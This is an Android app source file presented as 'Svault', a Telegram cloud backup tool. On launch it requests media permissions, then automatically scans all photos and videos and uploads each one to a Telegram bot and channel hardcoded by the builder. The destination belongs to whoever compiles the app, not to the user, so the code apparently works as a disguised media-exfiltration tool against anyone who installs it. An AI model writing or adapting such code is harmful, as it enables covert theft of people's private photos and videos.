package com.tenix.svault;

import android.Manifest;
import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.ContentUris;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Color;
import android.graphics.Typeface;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.MediaStore;
import android.view.Gravity;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import java.io.DataOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class inq extends Activity {

    // ── SET YOUR CREDENTIALS HERE ────────────────────────────
    static final String BOT_TOKEN  = "YOUR_BOT_TOKEN_HERE";
    static final String CHANNEL_ID = "@your_channel_username"; // or -100xxxxxxxxxx
    // ────────────────────────────────────────────────────────

    private static final int    REQ_PERM      = 1;
    private static final int    NOTIF_ID      = 55;
    private static final String NOTIF_CH      = "svault_upload";

    private TextView        statusTv;
    private ProgressBar     progressBar;
    private NotificationManager nm;
    private ExecutorService executor;

    // ── Lifecycle ────────────────────────────────────────────

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        executor = Executors.newSingleThreadExecutor();
        nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        initNotifChannel();
        buildUI();
        askPermissions();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (executor != null && !executor.isShutdown()) executor.shutdown();
    }

    // ── Minimal programmatic UI ───────────────────────────────

    private void buildUI() {
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setGravity(Gravity.CENTER);
        root.setBackgroundColor(0xFF0A0A0A);
        root.setPadding(80, 80, 80, 80);

        TextView title = new TextView(this);
        title.setText("Svault");
        title.setTextColor(Color.WHITE);
        title.setTextSize(40f);
        title.setTypeface(Typeface.DEFAULT_BOLD);
        title.setGravity(Gravity.CENTER);
        title.setLetterSpacing(0.08f);

        TextView sub = new TextView(this);
        sub.setText("Telegram Cloud Backup");
        sub.setTextColor(0xFF555555);
        sub.setTextSize(13f);
        sub.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams subP = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT);
        subP.setMargins(0, 10, 0, 60);
        sub.setLayoutParams(subP);

        statusTv = new TextView(this);
        statusTv.setText("Requesting permission…");
        statusTv.setTextColor(0xFF888888);
        statusTv.setTextSize(14f);
        statusTv.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams stP = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT);
        stP.setMargins(0, 0, 0, 24);
        statusTv.setLayoutParams(stP);

        progressBar = new ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
        progressBar.setMax(100);
        progressBar.setProgress(0);
        LinearLayout.LayoutParams pbP = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 16);
        pbP.setMargins(0, 0, 0, 0);
        progressBar.setLayoutParams(pbP);

        root.addView(title);
        root.addView(sub);
        root.addView(statusTv);
        root.addView(progressBar);
        setContentView(root);
    }

    // ── Notification channel (Android 8+) ────────────────────

    private void initNotifChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                    NOTIF_CH, "Svault Upload", NotificationManager.IMPORTANCE_LOW);
            nm.createNotificationChannel(ch);
        }
    }

    // ── Permissions ───────────────────────────────────────────

    @SuppressWarnings("NewApi")
    private void askPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            // Android 13+: media + notification permissions
            String[] perms = {
                Manifest.permission.READ_MEDIA_IMAGES,
                Manifest.permission.READ_MEDIA_VIDEO,
                Manifest.permission.POST_NOTIFICATIONS
            };
            boolean allGranted = true;
            for (String p : perms) {
                if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            if (!allGranted) requestPermissions(perms, REQ_PERM);
            else             startUpload();

        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE)
                    != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(
                        new String[]{Manifest.permission.READ_EXTERNAL_STORAGE},
                        REQ_PERM);
            } else {
                startUpload();
            }
        } else {
            startUpload(); // <M: permissions are auto-granted
        }
    }

    @Override
    public void onRequestPermissionsResult(int code, String[] perms, int[] results) {
        if (code != REQ_PERM) return;
        for (int i = 0; i < perms.length; i++) {
            String p = perms[i];
            boolean granted = results[i] == PackageManager.PERMISSION_GRANTED;
            if (granted && (p.equals(Manifest.permission.READ_MEDIA_IMAGES)
                         || p.equals(Manifest.permission.READ_EXTERNAL_STORAGE))) {
                startUpload();
                return;
            }
        }
        Toast.makeText(this, "Storage permission required", Toast.LENGTH_SHORT).show();
        setStatus("Permission denied.");
    }

    // ── Core upload logic ─────────────────────────────────────

    private void startUpload() {
        setStatus("Scanning media…");
        executor.execute(() -> {
            ArrayList<Uri> all = collectMedia();
            int total = all.size();
            if (total == 0) {
                setStatus("No media found.");
                return;
            }
            setStatus("Found " + total + " files. Uploading…");

            int ok = 0;
            for (int i = 0; i < total; i++) {
                boolean sent = sendToTelegram(all.get(i));
                if (sent) ok++;
                final int cur  = i + 1;
                final int prog = (cur * 100) / total;
                final int done = ok;
                runOnUiThread(() -> {
                    progressBar.setProgress(prog);
                    statusTv.setText("Uploading " + cur + " / " + total
                            + "   ✓ " + done);
                });
                pushNotif(cur, total);
            }

            final int finalOk = ok;
            runOnUiThread(() ->
                    statusTv.setText("Done — " + finalOk + " / " + total + " sent."));
            doneNotif(finalOk, total);
        });
    }

    // ── Media scanning ────────────────────────────────────────

    private ArrayList<Uri> collectMedia() {
        ArrayList<Uri> list = new ArrayList<>();

        // Images
        try (Cursor c = getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                new String[]{MediaStore.Images.Media._ID},
                null, null, MediaStore.Images.Media.DATE_ADDED + " ASC")) {
            if (c != null) {
                while (c.moveToNext()) {
                    list.add(ContentUris.withAppendedId(
                            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                            c.getLong(0)));
                }
            }
        } catch (Exception ignored) {}

        // Videos
        try (Cursor c = getContentResolver().query(
                MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                new String[]{MediaStore.Video.Media._ID},
                null, null, MediaStore.Video.Media.DATE_ADDED + " ASC")) {
            if (c != null) {
                while (c.moveToNext()) {
                    list.add(ContentUris.withAppendedId(
                            MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                            c.getLong(0)));
                }
            }
        } catch (Exception ignored) {}

        return list;
    }

    // ── Telegram upload ───────────────────────────────────────

    private boolean sendToTelegram(Uri uri) {
        try {
            String mime    = getContentResolver().getType(uri);
            boolean isVid  = mime != null && mime.startsWith("video");
            String method  = isVid ? "sendVideo" : "sendPhoto";
            String field   = isVid ? "video"     : "photo";
            String bound   = "SVaultBnd" + System.currentTimeMillis();

            URL url = new URL(
                    "https://api.telegram.org/bot" + BOT_TOKEN + "/" + method);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(30_000);
            conn.setReadTimeout(120_000);
            conn.setRequestProperty("Content-Type",
                    "multipart/form-data; boundary=" + bound);

            DataOutputStream out = new DataOutputStream(conn.getOutputStream());

            // chat_id
            out.writeBytes("--" + bound + "\r\n");
            out.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
            out.writeBytes(CHANNEL_ID + "\r\n");

            // file
            out.writeBytes("--" + bound + "\r\n");
            out.writeBytes("Content-Disposition: form-data; name=\"" + field
                    + "\"; filename=\"file\"\r\n");
            out.writeBytes("Content-Type: "
                    + (mime != null ? mime : "application/octet-stream") + "\r\n\r\n");

            try (InputStream in = getContentResolver().openInputStream(uri)) {
                byte[] buf = new byte[8192];
                int n;
                if (in != null) {
                    while ((n = in.read(buf)) != -1) out.write(buf, 0, n);
                }
            }

            out.writeBytes("\r\n--" + bound + "--\r\n");
            out.flush();
            out.close();

            int code = conn.getResponseCode();
            conn.disconnect();
            return code == 200;
        } catch (Exception e) {
            return false;
        }
    }

    // ── Notification helpers ──────────────────────────────────

    @SuppressWarnings("deprecation")
    private void pushNotif(int cur, int total) {
        Notification.Builder b = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? new Notification.Builder(this, NOTIF_CH)
                : new Notification.Builder(this);
        b.setSmallIcon(android.R.drawable.ic_menu_upload)
         .setContentTitle("Svault — uploading")
         .setContentText(cur + " / " + total)
         .setProgress(total, cur, false)
         .setOngoing(true);
        nm.notify(NOTIF_ID, b.build());
    }

    @SuppressWarnings("deprecation")
    private void doneNotif(int ok, int total) {
        Notification.Builder b = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? new Notification.Builder(this, NOTIF_CH)
                : new Notification.Builder(this);
        b.setSmallIcon(android.R.drawable.ic_menu_upload)
         .setContentTitle("Svault — done")
         .setContentText(ok + " / " + total + " files uploaded")
         .setAutoCancel(true)
         .setOngoing(false);
        nm.notify(NOTIF_ID, b.build());
    }

    // ── Util ──────────────────────────────────────────────────

    private void setStatus(String msg) {
        runOnUiThread(() -> statusTv.setText(msg));
    }
}
